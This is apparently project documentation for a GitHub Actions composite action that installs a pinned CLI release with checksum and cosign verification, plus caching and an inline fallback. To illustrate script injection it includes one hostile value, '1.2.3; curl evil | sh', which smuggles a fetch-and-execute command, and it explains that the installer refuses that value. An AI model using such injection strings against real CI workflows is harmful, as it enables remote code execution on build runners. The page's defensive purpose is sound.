# GitHub Actions

Running a site file on GitHub Actions: a composite action that installs one pinned
release and runs one command on it. GitHub Actions is the first native CI
([ADR 0008](adr/0008-github-actions-first.md)); this covers the first of the five things
the decision calls "native" — the action, in source form, plus the verified install it
stands on. The other four are under [Not done yet](#not-done-yet).

## The action

```yaml
name: ship
on:
  push:
    branches: [main]
  pull_request:

permissions:
  contents: read
  id-token: write          # only needed by steps that federate a cloud role
  checks: write
  pull-requests: write

jobs:
  keepshipping:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@<40-hex-commit-sha> # v4.4.0
      - uses: Keep-Shipping/action@<commit-sha>
        with:
          version: 1.2.3
```

`1.2.3` is the exact version you pinned — an example, not a release that exists. The
crate versions are still `0.0.0` and nothing is published yet.

Both `uses:` are pinned to a commit SHA, not a tag: a tag is a name somebody can move,
and a SHA is the artifact you read. The action's own SHA is a placeholder until the
mirror repository exists — see [the fallback](#the-fallback-until-the-action-repository-is-public).
`on: push` on `main` and `on: pull_request` are the two triggers the issue asks for;
mapping a plan's own `on:` block onto them is [not done yet](#not-done-yet).

## Inputs

| Input | Required | Default | Meaning |
|---|---|---|---|
| `version` | yes | — | An exact version: `1.2.3` or `1.2.3-rc.1`. `latest` is refused |
| `command` | no | `run` | `run` or `check`; anything else is a usage error |
| `file` | no | `ship.ks` | The site file, as the CLI defaults it |
| `args` | no | `''` | Extra flags as one string: `--until plan --non-interactive`, `--format github` |
| `verify-signature` | no | `'true'` | Verify `SHA256SUMS` with cosign before installing |
| `cache` | no | `'true'` | Restore and save the step cache through the Actions cache API |

The action runs `keepshipping <command> <file> --context ci <args>`. The issue's `--ci`
is spelled `--context ci`: the flag takes a value, and `ci` is one of the two
([docs/CLI.md](CLI.md)). The action validates `command` itself before it builds the
line. `--context ci` is stated rather than detected: `GITHUB_ACTIONS` and `CI` already
imply it, but a job that sets `CI=false` still means CI here. For inline annotations on
the pull request, pass `args: --format github` to `check`
([docs/DIAGNOSTICS.md](DIAGNOSTICS.md#--format-github)).

`args` is split on whitespace, with no globbing and no quote handling, so **it cannot
carry a quoted value**: `--only 'a b'` is two arguments, not one. Use `env:` and the
CLI's own flags for anything whose value contains a space.

## What the install verifies

`action/install.sh` fetches, verifies, then installs — in that order, and nothing
reaches the install directory unless every check passed. It refuses, non-zero and with
a message naming the fix, on a version that is not an exact version, an `uname` no
release is built for, a download that fails after `curl`'s retries, an archive whose
sha256 does not match **the line in `SHA256SUMS` whose filename is exactly this
archive's**, and — with `verify-signature: true` — a `SHA256SUMS` that does not verify
against `SHA256SUMS.bundle` under cosign keyless, pinned to

```
--certificate-identity     https://github.com/Keep-Shipping/harness/.github/workflows/release.yml@refs/tags/v<version>
--certificate-oidc-issuer  https://token.actions.githubusercontent.com
```

The match is on the whole filename, never a substring: grepping `keepshipping-1.2.3`
matches every target's archive in the file, and an archive from another target is
exactly what must not be installed under this one's name. A name that appears twice is
a release that disagrees with itself, so it is refused rather than guessed at. A
missing `cosign`, a bundle that will not verify, and any other signing identity all
fail closed.

### What `verify-signature: false` means

**There is no authenticity check at all.** `SHA256SUMS` is downloaded from the same
server as the archive, so an attacker who can substitute one can substitute the other.
The checksum then catches corruption and nothing else — it proves the bytes did not
change on the way, not that Keep Shipping published them. Turn this off only where you
already trust the transport and the host; the script says so on stdout rather than
passing silently.

### What is not verified, stated plainly

- **The binary's own version.** `keepshipping` has no `--version` today, so nothing
  reads the version back off the installed file. What is proven is that the bytes match
  a checksum a release workflow signed.
- **Anything inside the archive.** `LICENSE` and `README.md` travel with the binary
  (ADR 0006) and are extracted and discarded; only the archive's checksum is checked.
- **The site file, the plan, or the run.** That is the command's job
  ([docs/DIAGNOSTICS.md](DIAGNOSTICS.md)), not the installer's.

`install.sh` reads everything from the environment (`KS_VERSION`, `KS_BASE_URL`,
`KS_INSTALL_DIR`, `KS_VERIFY_SIGNATURE`) and the action passes inputs through `env:`.
A workflow input interpolated into `run:` text is script injection; on this path a
`version` of `1.2.3; curl evil | sh` is a value, and is refused as not a version.

## Caching

`cache: true` wraps the step cache at `~/.cache/keepshipping/steps` — the directory
[docs/CACHING.md](CACHING.md) names, with `$XDG_CACHE_HOME` unset on the runners — in
`actions/cache`, keyed on `runner.os`, the version, and the hashes of `ship.lock` and
the site file. A hit is still a hit the engine has to verify before it skips: a key
match alone never skips a step.

## The fallback, until the action repository is public

The repository stays private until M1 exits
([ADR 0006](adr/0006-licence-and-open-source-model.md)), so `Keep-Shipping/action`
cannot be `uses:`'d from anywhere else yet. Until then, run the same steps inline,
pinned by commit and never `curl … | bash` — the script is downloaded to a file and
read, and then it fetches:

```yaml
      - uses: sigstore/cosign-installer@<40-hex-commit-sha> # v3.9.2

      - name: Install keepshipping
        shell: bash
        env:
          KS_VERSION: 1.2.3
        run: |
          set -euo pipefail
          curl -fsSL -o install.sh \
            "https://raw.githubusercontent.com/Keep-Shipping/harness/<commit-sha>/action/install.sh"
          KS_INSTALL_DIR="$RUNNER_TOOL_CACHE/keepshipping" bash install.sh
          echo "$RUNNER_TOOL_CACHE/keepshipping" >> "$GITHUB_PATH"

      - run: keepshipping run ship.ks --context ci --non-interactive
```

That is the same `install.sh` the action runs, from the same commit the `uses:` would
have pinned. To inline the checks without any reference to this repository, download
the artefacts directly and verify them with the two tools a human can read:

```yaml
      - name: Download and verify the release
        shell: bash
        env:
          KS_VERSION: 1.2.3
        run: |
          set -euo pipefail
          base="https://github.com/Keep-Shipping/harness/releases/download/v$KS_VERSION"
          archive="keepshipping-$KS_VERSION-x86_64-unknown-linux-gnu.tar.xz"
          curl -fsSL -O "$base/$archive" -O "$base/SHA256SUMS" -O "$base/SHA256SUMS.bundle"
          cosign verify-blob \
            --bundle SHA256SUMS.bundle \
            --certificate-identity "https://github.com/Keep-Shipping/harness/.github/workflows/release.yml@refs/tags/v$KS_VERSION" \
            --certificate-oidc-issuer https://token.actions.githubusercontent.com \
            SHA256SUMS
          sha256sum -c --ignore-missing SHA256SUMS
          tar -xf "$archive"
          sudo install -m 0755 "keepshipping-$KS_VERSION/keepshipping" /usr/local/bin/keepshipping
```

The same three checks in the same order, written out. Prefer `install.sh`: it derives
the triple and the archive format from `uname`, so the same step works on a macOS
runner without being edited.

## Not done yet

- **No `keepshipping init --ci github`.** Nothing writes this workflow yet.
- **No trigger mapping.** `crates/cli/src/github_actions_run_context.rs` (#150) answers
  the `RunContext` port from the runner's variables, but the command dispatch hands it
  no context, so `run` still selects its environment the way a laptop does. A local
  `RunContext` adapter is what gives the two the same shape.
- **No `on:` coverage warning from `check`.** Nothing yet tells a repository that a plan
  declares `on: push main` and no workflow triggers on it.
- **No pin in `ship.lock`.** The version is an action input because the lockfile has no
  keepshipping entry; reading it from there changes the lockfile format, not the action.
- **No mirror repository.** `action/` here is the source; `Keep-Shipping/action` is
  where it gets published, and it does not exist yet.
- **No end-to-end digest comparison** on a test repository: the claim that a site shows
  one digest on the laptop and on the runner is written down in
  [docs/REPRODUCIBILITY.md](REPRODUCIBILITY.md) and still has to be measured (#44).